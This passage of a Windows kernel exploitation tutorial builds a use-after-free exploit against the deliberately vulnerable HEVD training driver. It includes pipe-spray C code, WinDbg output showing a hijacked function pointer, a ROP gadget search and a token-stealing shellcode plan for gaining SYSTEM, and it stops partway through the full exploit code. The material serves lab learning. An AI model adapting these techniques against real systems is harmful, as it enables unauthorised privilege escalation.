+</span></span><span style="display:flex;"><span>	DWORD bytesWritten <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(hWrite, buff, <span style="color:#66d9ef">sizeof</span>(buff), <span style="color:#f92672">&amp;</span>bytesWritten, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Error writing to pipe, exiting...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hRead);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hWrite);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	rwPipe pipeHandles;
+</span></span><span style="display:flex;"><span>	pipeHandles.hRead <span style="color:#f92672">=</span> hRead;
+</span></span><span style="display:flex;"><span>	pipeHandles.hWrite <span style="color:#f92672">=</span> hWrite;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> pipeHandles;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	hDevice <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileW</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver"</span>, GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE, FILE_SHARE_READ <span style="color:#f92672">|</span> FILE_SHARE_WRITE, <span style="color:#ae81ff">0</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hDevice <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Couldn't get HANDLE to driver, error %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Allocating objects for defragmentation spray...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	p_rwPipe defrag_pipeHandles <span style="color:#f92672">=</span> (p_rwPipe)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">30000</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(rwPipe));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">30000</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		rwPipe pipeHandle <span style="color:#f92672">=</span> <span style="color:#a6e22e">objSpray</span>();
+</span></span><span style="display:flex;"><span>		defrag_pipeHandles[i] <span style="color:#f92672">=</span> pipeHandle;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Allocating objects for sequential spray...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	p_rwPipe seq_pipeHandles <span style="color:#f92672">=</span> (p_rwPipe)<span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">60000</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(rwPipe));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">60000</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		rwPipe pipeHandle <span style="color:#f92672">=</span> <span style="color:#a6e22e">objSpray</span>();
+</span></span><span style="display:flex;"><span>		seq_pipeHandles[i] <span style="color:#f92672">=</span> pipeHandle;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Punching holes...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(seq_pipeHandles); i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			rwPipe pipeHandles <span style="color:#f92672">=</span> seq_pipeHandles[i];
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">CloseHandle</span>(pipeHandles.hRead);
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">CloseHandle</span>(pipeHandles.hWrite);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Calling AllocateUaFObjectNonPagedPool, IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x804</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">DeviceIoControl</span>(hDevice, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x804</span>), NULL, <span style="color:#ae81ff">0</span>, NULL, <span style="color:#ae81ff">0</span>, NULL, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Error calling AllocateUaFObjectNonPagedPool's IOCTL, error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[i] Calling FreeUaFObjectNonPagedPool, IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x806</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">DeviceIoControl</span>(hDevice, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x806</span>), NULL, <span style="color:#ae81ff">0</span>, NULL, <span style="color:#ae81ff">0</span>, NULL, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Error calling FreeUaFObjectNonPagedPool's IOCTL, error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PFAKE_OBJECT_NON_PAGED_POOL fakeObj <span style="color:#f92672">=</span> (PFAKE_OBJECT_NON_PAGED_POOL)<span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(FAKE_OBJECT_NON_PAGED_POOL));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(fakeObj<span style="color:#f92672">-&gt;</span>Buffer, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x54</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[*] Writing to holes...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">30000</span>; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">DeviceIoControl</span>(hDevice, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x807</span>), fakeObj, <span style="color:#66d9ef">sizeof</span>(fakeObj), NULL, <span style="color:#ae81ff">0</span>, NULL, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Error calling AllocateFakeObjectNonPagedPool's IOCTL, error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[*] Press enter to trigger UAF...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">DeviceIoControl</span>(hDevice, <span style="color:#a6e22e">IOCTL</span>(<span style="color:#ae81ff">0x805</span>), NULL, <span style="color:#ae81ff">0</span>, NULL, <span style="color:#ae81ff">0</span>, NULL, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Error calling UseUaFObjectNonPagedPool's IOCTL, error: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre><button class="copy-code">copy</button></div><p>Before running the exploit, let’s set a breakpoint on the <code>call rcx</code> instruction from <code>UseUaFObjectNonPagedPool</code> at HEVD+0x87D66.</p>
+<p><img alt="d32bf927786327c5d553f646ca8e4b0e.png" loading="lazy" src="https://m2rc.net/d32bf927786327c5d553f646ca8e4b0e.png"></p>
+<p>After running the exploit, we can see we successfully hijacked the function pointer from <code>g_UseAfterFreeObjectNonPagedPool-&gt;Callback</code>, and it now points to 0x4141414141414141.</p>
+<pre tabindex="0"><code>0: kd&gt; bp HEVD+0x87D66
+0: kd&gt; g
+****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******
+[+] Using UaF Object
+[+] g_UseAfterFreeObjectNonPagedPool: 0xFFFFC107E7914D20
+[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x4141414141414141
+[+] Calling Callback
+Breakpoint 0 hit
+HEVD+0x87d66:
+fffff805`46f27d66 ffd1            call    rcx
+1: kd&gt; r
+rax=ffffc107e7914d20 rbx=000000000000004d rcx=4141414141414141
+rdx=0000000000000015 rsi=00000000c00000bb rdi=000000000000004d
+rip=fffff80546f27d66 rsp=fffffb816da4c6b0 rbp=ffffc107de0f9520
+ r8=000000000000004d  r9=0000000000000003 r10=0000000000000000
+r11=0000000000000000 r12=0000000000000000 r13=0000000000000000
+r14=ffffc107de0f95f0 r15=ffffc107e1854670
+iopl=0         nv up ei pl nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00040206
+HEVD+0x87d66:
+fffff805`46f27d66 ffd1            call    rcx {41414141`41414141}
+</code><button class="copy-code">copy</button></pre><p>The function pointer was attempted to be called, but the reason it didn’t BSOD is that the driver has a <code>__try</code> <code>__except</code> exception handler when calling the <code>g_UseAfterFreeObjectNonPagedPool-&gt;Callback()</code> function.</p>
+<p>Great, now that we can control RIP, let’s figure out a way to execute shellcode.</p>
+<p>If you paid close attention to the disassembly earlier, the fake object’s address was held in the <code>rax</code> register, this is also confirmed by the debug output. Since the fake object was allocated using the <code>NonPagedPool</code> parameter on <code>ExAllocatePoolWithTag</code>, this memory will be executable. We can check this as well by looking at the PTE (page table entry) for the fake object’s address.</p>
+<pre tabindex="0"><code>1: kd&gt; r rax
+rax=ffffc107e7914d20
+1: kd&gt; !pte ffffc107e7914d20
+                                           VA ffffc107e7914d20
+PXE at FFFF984C26130C10    PPE at FFFF984C261820F8    PDE at FFFF984C3041F9E0    PTE at FFFF986083F3C8A0
+contains 0A0000013FE38863  contains 0A0000013FE3B863  contains 0A000000B1903863  contains 0A0000005C632963
+pfn 13fe38    ---DA--KWEV  pfn 13fe3b    ---DA--KWEV  pfn b1903     ---DA--KWEV  pfn 5c632     -G-DA--KWEV
+</code><button class="copy-code">copy</button></pre><p>As we can see, the page is writable and executable (WE).</p>
+<p><img alt="b7230aecea94bf1fe45c2b8d2d13e365.png" loading="lazy" src="https://m2rc.net/b7230aecea94bf1fe45c2b8d2d13e365.png"></p>
+<p>This means we could write shellcode directly in our fake object, right after the Callback function pointer, leaving us with 84 bytes of space for our shellcode, more than enough for a token-stealing shellcode.</p>
+<p>Before doing this, let’s try to find a gadget that will allow us to call the shellcode from @rax+0x8 or similar. This will depend on your specific kernel version, so look for your own using <a href="https://github.com/sashs/Ropper">ropper</a>.</p>
+<pre tabindex="0"><code>$ ropper --file ntoskrnl_10.0.22621.4317.exe --search "add al, "
+...
+0x00000001403fc667: add al, 0x10; call rax; 
+</code><button class="copy-code">copy</button></pre><p>In my case, I found a <code>add al, 0x10; call rax;</code> at ntoskrnl.exe+0x3FC667. Now, if we check this in a debugger, we’ll see it isn’t exactly calling RAX, it’s calling a function that will end up doing a <code>jmp rax</code> for us.</p>
+<pre tabindex="0"><code>1: kd&gt; u nt+0x3FC667
+nt!SymCryptEcpointIsZero+0x1b:
+fffff805`1b9fc667 0410            add     al,10h
+fffff805`1b9fc669 e8728c6f00      call    nt!_guard_retpoline_indirect_rax (fffff805`1c0f52e0)
+fffff805`1b9fc66e 4883c428        add     rsp,28h
+fffff805`1b9fc672 c3              ret
+
+0: kd&gt; u fffff807`57af52e0+40
+nt!_guard_retpoline_indirect_rax+0x40:
+fffff807`57af5320 48890424        mov     qword ptr [rsp],rax
+fffff807`57af5324 c3              ret
+fffff807`57af5325 65800c255608000001 or    byte ptr gs:[856h],1
+fffff807`57af532e 65f604255608000002 test  byte ptr gs:[856h],2
+fffff807`57af5337 7502            jne     nt!_guard_retpoline_indirect_rax+0x5b (fffff807`57af533b)
+fffff807`57af5339 eb65            jmp     nt!_guard_retpoline_exit_indirect_rax (fffff807`57af53a0)
+fffff807`57af533b 0faee8          lfence
+fffff807`57af533e 48ffe0          jmp     rax &lt;--- jmp to our shellcode
+</code><button class="copy-code">copy</button></pre><p>I will be using <a href="https://github.com/wetw0rk/Sickle/blob/master/src/sickle/payloads/windows/x64/kernel_token_stealer.py">https://github.com/wetw0rk/Sickle/blob/master/src/sickle/payloads/windows/x64/kernel_token_stealer.py</a> for generating the token-stealing shellcode. Now, as noted in the script, the shellcode doesn’t return, so we’ll have to do it ourselves.</p>
+<p>Since we are 2 call instructions deep, the return address created from the initial <code>call rcx</code> of <code>g_UseAfterFreeObjectNonPagedPool-&gt;Callback()</code> should be at rsp+8, so we’ll just have to add these instructions to our shellcode.</p>
+<pre tabindex="0"><code>0:  48 83 c4 08             add    rsp,0x8
+4:  c3                      ret
+</code><button class="copy-code">copy</button></pre><p>What this shellcode will do is find the <code>_EPROCESS</code> for the SYSTEM process (always PID 4) by traversing the <code>nt!_EPROCESS.ActiveProcessLinks</code> until it finds a match, then, it will copy its <code>nt!_EPROCESS.Token</code> into the current process (our exploit’s process), elevating our privileges to <code>NT AUTHORITY\SYSTEM</code>.</p>
+<p>Keep in mind this shellcode hardcodes the <code>nt!_EPROCESS.Token</code> offset at <code>nt!_EPROCESS+0x4b8</code>, which has changed in the recent Windows 11 24H2 version, now at <code>nt!_EPROCESS+0x248</code>.</p>
+<p>This is the full exploit code, keep in mind the <code>CALL_RAX_GADGET</code> will have to be adjusted for your specific kernel version:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Psapi.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define QWORD ULONGLONG
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _FAKE_OBJECT_NON_PAGED_POOL {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	CHAR Buffer[<span style="color:#ae81ff">0x54</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(PVOID)];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>} _fakeObj, <span style="color:#f92672">*</span> _pfakeObj;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _rwPipe {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE hRead;
+</span></span><span style="display:flex;"><span>	HANDLE hWrite;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>} rwPipe, <span style="color:#f92672">*</span>p_rwPipe;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HANDLE hDevice <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rwPipe <span style="color:#a6e22e">objSpray</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE hRead  <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	HANDLE hWrite <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span> buff[<span style="color:#ae81ff">0x20</span>] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memset</span>(buff, <span style="color:#ae81ff">0x41</span>, <span style="color:#66d9ef">sizeof</span>(buff));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">CreatePipe</span>(<span style="color:#f92672">&amp;</span>hRead, <span style="color:#f92672">&amp;</span>hWrite, NULL, <span style="color:#66d9ef">sizeof</span>(buff))) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Error creating pipe, exiting...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	DWORD bytesWritten <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">WriteFile</span>(hWrite, buff, <span style="color:#66d9ef">sizeof</span>(buff), <span style="color:#f92672">&amp;</span>bytesWritten, NULL)) {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">"[-] Error writing to pipe, exiting...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hRead);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">CloseHandle</span>(hWrite);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	rwPipe pipeHandles;
+</span></span><span style="display:flex;"><span>	pipeHandles.hRead  <span style="color:#f92672">=</span> hRead;
+</span></span><span style="display:flex;"><span>	pipeHandles.hWrite <span style="color:#f92672">=</span> hWrite;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> pipeHandles;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">checkEoP</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PTOKEN_USER pTokenUser;
+</span></span><span style="display:flex;"><span>	HANDLE		hToken;
+</span></span><span style="display:flex;"><span>	DWORD		returnLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">OpenProcessToken</span>(<span style="color:#a6e22e">GetCurrentProcess</span>(), TOKEN_QUERY, <span style="color:#f92672">&amp;</span>hToken)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">GetTokenInformation</span>(hToken, TokenUser, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>returnLength);
+</span></span><span style="display:flex;"><span>	pTokenUser <span style="color:#f92672">=</span> (PTOKEN_USER)<span style="color:#a6e22e">malloc</span>(returnLength);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">GetTokenInformation</span>(hToken, TokenUser, pTokenUser, returnLength, <span style="color:#f92672">&amp;</span>returnLength);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> sidString;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ConvertSidToStringSidA</span>(pTokenUser<span style="color:#f92672">-&gt;</span>User.Sid, <span style="color:#f92672">&amp;</span>sidString);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(sidString, <span style="color:#e6db74">"S-1-5-18"</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// from https://vuln.dev/windows-kernel-exploitation-hevd-x64-use-after-free/
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>QWORD <span style="color:#a6e22e">getBaseAddr</span>(LPCWSTR drvName) {
+</span></span><span style="display:flex;"><span>	LPVOID drivers[<span style="color:#ae81ff">512</span>];
+</span></span><span style="display:flex;"><span>	DWORD cbNeeded;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> nDrivers, i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">EnumDeviceDrivers</span>(drivers, <span style="color:#66d9ef">sizeof</span>(drivers), <span style="color:#f92672">&amp;</span>cbNeeded) <span style="color:#f92672">&amp;&amp;</span> cbNeeded <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(drivers)) {
+</span></span><span style="display:flex;"><span>		WCHAR szDrivers[<span style="color:#ae81ff">512</span>];
+</span></span><span style="display:flex;"><span>		nDrivers <span style="color:#f92672">=</span> cbNeeded <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(drivers[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> nDrivers; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">GetDeviceDriverBaseName</span>(drivers[i], szDrivers, <span style="color:#66d9ef">sizeof</span>(szDrivers) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(szDrivers[<span style="color:#ae81ff">0</span>]))) {
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">wcscmp</span>(szDrivers, drvName) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">return</span> (QWORD)drivers[i];
+</span></span><span style="display:flex;"><span>				}
+</span></span><span style="display:flex;"><span>			}
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> argv[]) {
+</span></span><span style="display:flex;"><span>
